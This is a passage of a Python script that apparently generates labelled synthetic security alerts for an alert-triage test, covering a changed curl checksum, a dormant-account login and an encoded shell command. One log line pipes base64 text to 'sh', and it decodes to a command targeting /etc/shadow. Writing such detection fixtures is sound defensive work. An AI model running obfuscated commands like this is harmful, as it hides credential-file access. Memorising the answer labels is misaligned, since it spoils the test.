          "One system binary changes checksum with no package-manager record in the same window to explain it."),
    [
        (0, "550", 7, "Integrity checksum changed.",
         ["ossec", "syscheck", "syscheck_entry_modified"], ["T1554"],
         {"process": "/usr/bin/curl"},
         "Aug 18 09:42:00 app02 ossec: Integrity checksum changed for '/usr/bin/curl'"),
    ],
)

case(
    "dormant_login", "dc01", 1.6,
    label("inconclusive", True, "medium", ["T1078.002"],
          "An account dormant for months authenticates successfully at 01:36; unusual but not proof of misuse."),
    [
        (0, "5715", 3, "sshd: authentication success.",
         ["syslog", "sshd", "authentication_success"], ["T1078.002"],
         {"srcip": "10.10.1.44", "srcuser": "former_admin"},
         "Aug 18 01:36:00 dc01 sshd[1140]: Accepted password for former_admin from 10.10.1.44 port 40122 ssh2"),
    ],
)

case(
    "encoded_command", "app02", 16.8,
    label("inconclusive", True, "medium", ["T1027"],
          "A base64-encoded shell command runs under an admin session; could be tooling or an attempt to hide intent."),
    [
        (0, "100400", 8, "Encoded shell command executed.",
         ["audit", "command"], ["T1027"],
         {"srcuser": "natali"},
         "Aug 18 16:48:00 app02 audit: bash -c \"echo ZW51bSAvZXRjL3NoYWRvdw== | base64 -d | sh\""),
    ],
)


def build() -> tuple[list[dict], dict]:
    records: list[dict] = []
    labels: dict[str, dict] = {}
    for entry in CASES:
        labels[entry["name"]] = entry["label"]
        clock = entry["start"]
        for n, (gap, rid, level, desc, groups, mitre, data, log) in enumerate(entry["alerts"]):
            clock = clock + timedelta(seconds=gap)
            records.append(
                {
                    "id": f"{entry['name']}-{n}",
                    "timestamp": clock.isoformat().replace("+00:00", "Z"),
                    "rule": {
                        "id": rid,
                        "level": level,
                        "description": desc,
                        "groups": groups,
                        "mitre": {"id": mitre},
                    },
                    "agent": {"name": entry["host"]},
                    "data": data,
                    "full_log": log,
                    "case": entry["name"],
                }
            )
    records.sort(key=lambda r: r["timestamp"])
    return records, labels


if __name__ == "__main__":
    records, labels = build()
    (HERE / "alerts.jsonl").write_text(
        "\n".join(json.dumps(r) for r in records) + "\n", encoding="utf-8"
    )
    (HERE / "labels.json").write_text(json.dumps(labels, indent=2), encoding="utf-8")
    print(f"{len(records)} alerts across {len(labels)} cases")
